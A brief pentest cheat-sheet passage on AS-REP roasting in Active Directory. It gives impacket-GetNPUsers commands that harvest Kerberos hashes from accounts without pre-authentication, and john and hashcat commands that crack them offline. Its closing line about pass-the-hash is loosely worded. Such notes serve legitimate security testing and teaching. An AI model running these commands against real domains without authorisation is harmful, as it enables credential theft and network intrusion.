## Enumeration

Lists users and passwords is not required Kerberos pre auth. Used for ASREPRoasting.

```sh
# Find a password hashes of given users
impacket-GetNPUsers -dc-ip <target-ip> example.local/ -no-pass -usersfile users.txt

# Find a password hash of given user
impacket-GetNPUsers -dc-ip <target-ip> example.local/<username> -no-pass -format hashcat 
```

If we find a password hash, crack it.

```sh
john --format=krb5asrep --wordlist=wordlist.txt hash.txt
# or
hashcat -m 18200 -a 0  hash.txt wordlist.txt
```

Also, we can use it to **Pass-The-Hash** attack.
